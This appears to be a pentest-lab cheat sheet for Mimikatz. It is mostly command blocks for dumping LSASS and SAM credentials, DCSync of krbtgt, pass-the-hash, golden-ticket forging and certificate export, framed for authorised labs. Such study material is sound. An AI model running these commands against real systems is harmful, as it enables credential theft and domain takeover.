---
title: "Mimikatz"
description: "Mimikatz credential extraction: sekurlsa, LSA dumps, DCSync, pass-the-hash/ticket, golden/silver tickets."
category: active-directory
subcategory: "Tooling & Recon"
tags: [active-directory, credentials, kerberos]
tools: [Mimikatz]
difficulty: intermediate
updated: "2026-08-09"
source: "vault:Tools/Mimikatz-Cheatsheet.md"
---

# Mimikatz

> **Context —** HTB / CPTS / authorised AD labs. Tool: Mimikatz (module reference).

Windows credential / Kerberos post-exploitation reference for authorised assessments. Commands track the upstream README and wiki. Prefer modern alternatives (`nxc … --sam/--lsa`, `secretsdump`, Rubeus) when EDR blocks Mimikatz — still learn the module language for older labs and reports.

Related notes: Rubeus, Impacket, NetExec, Hashcat, Certipy, Cobalt Strike.

## Summary

Mimikatz reads Windows secrets from LSASS, SAM/LSA, and Kerberos, and can perform PtH/PtT and ticket forging. On modern hosts expect Credential Guard, LSA protection, and EDR to block naive runs. Use only with authorisation; treat dumps as highly sensitive evidence.

> **Danger — Authorised-use framing**
> 1. Requires appropriate privileges (often high integrity + `SeDebugPrivilege`).
> 2. LSASS access is loudly monitored — prefer lab-safe methods when possible.
> 3. Never run against production without explicit ROE.

## Session Hygiene

```text
mimikatz # log
mimikatz # privilege::debug
mimikatz # token::elevate          # when needed
mimikatz # version
```

> **Important — Prerequisites**
> 1. `privilege::debug` should return OK before `sekurlsa::*`.
> 2. `log` writes a transcript — useful for reports.
> 3. Architecture must match (x64 mimikatz on x64 Windows).

## sekurlsa (LSASS)

```text
sekurlsa::logonpasswords
sekurlsa::tickets /export
sekurlsa::ekeys
sekurlsa::pth /user:Administrator /domain:DOMAIN /ntlm:NTHASH /run:cmd.exe
```

> **Module breakdown**
> 1. **logonpasswords**: MSV / TSPKG / WDigest / Kerberos material from logon sessions.
> 2. **tickets /export**: `.kirbi` files for Rubeus `ptt` or Mimikatz `kerberos::ptt`.
> 3. **pth**: spawn a process with alternate NTLM credentials (PTH).
> 4. WDigest cleartext appears only if WDigest is enabled (legacy configs).

## lsadump / DCSync

```text
lsadump::sam
lsadump::secrets
lsadump::lsa /patch
lsadump::dcsync /domain:DOMAIN.LOCAL /user:krbtgt
lsadump::dcsync /domain:DOMAIN.LOCAL /user:Administrator
lsadump::dcsync /domain:DOMAIN.LOCAL /all /csv
```

> **Warning — DCSync rights**
> 1. Needs replication rights (e.g. Domain Admins / equivalent ACLs) — map with BloodHound.
> 2. Prefer Impacket `secretsdump.py -just-dc-user` from Linux when you already have creds.
> 3. `/user:krbtgt` enables golden-ticket tradecraft — document carefully.

## kerberos

```text
kerberos::list /export
kerberos::ptt c:\temp\ticket.kirbi
kerberos::purge
kerberos::golden /user:Administrator /domain:domain.local \
  /sid:S-1-5-21-... /krbtgt:KRBTGT_NT_HASH /ptt
```

> **Tip —** Harvest/monitor/roast flows are often cleaner in Rubeus, but Mimikatz remains ubiquitous in writeups and older lab guides.

## crypto / vault

```text
crypto::capi
crypto::cng
crypto::certificates /export
crypto::certificates /export /systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE
crypto::keys /export
vault::cred
vault::list
```

## Practical Recipes

```text
# A) Local admin → LSASS → PTH
privilege::debug
sekurlsa::logonpasswords
sekurlsa::pth /user:Administrator /domain:CORP /ntlm:fc525c96... /run:powershell.exe

# B) DA → DCSync krbtgt → golden
lsadump::dcsync /domain:corp.local /user:krbtgt
kerberos::golden /user:EvilAdmin /domain:corp.local /sid:S-1-5-21-... \
  /krbtgt:HASH /ptt

# C) Export tickets for offline reuse
sekurlsa::tickets /export
```

## Troubleshooting & Gotchas

> **Common failures**
> 1. **Privilege '20' KO**: not elevated / PPL blocking — try accepted lab bypasses only inside ROE.
> 2. **Empty passwords**: Credential Guard / no WDigest — collect NT hashes or tickets instead.
> 3. **AV deleted binary**: sideload from approved C2 toolkit or use non-Mimikatz dumpers in that lab.

## Lessons Learned

1. `privilege::debug` + matching arch before anything else.
2. Export tickets early; sessions disappear on logoff.
3. DCSync > interactive LSASS on DCs when you already have replication rights.
4. Cross-tool fluency (Mimikatz ↔ Rubeus ↔ Impacket) matters more than one binary.
5. Treat outputs as credential inventory for the report, not a souvenir stash.

## References

1. gentilkiwi/mimikatz: https://github.com/gentilkiwi/mimikatz
2. Mimikatz Wiki: https://github.com/gentilkiwi/mimikatz/wiki
3. gentilkiwi blog: https://blog.gentilkiwi.com/mimikatz
4. MITRE ATT&CK — OS Credential Dumping: https://attack.mitre.org/techniques/T1003/
5. HackTricks — Mimikatz: https://book.hacktricks.xyz/windows-hardening/stealing-credentials/credentials-mimikatz
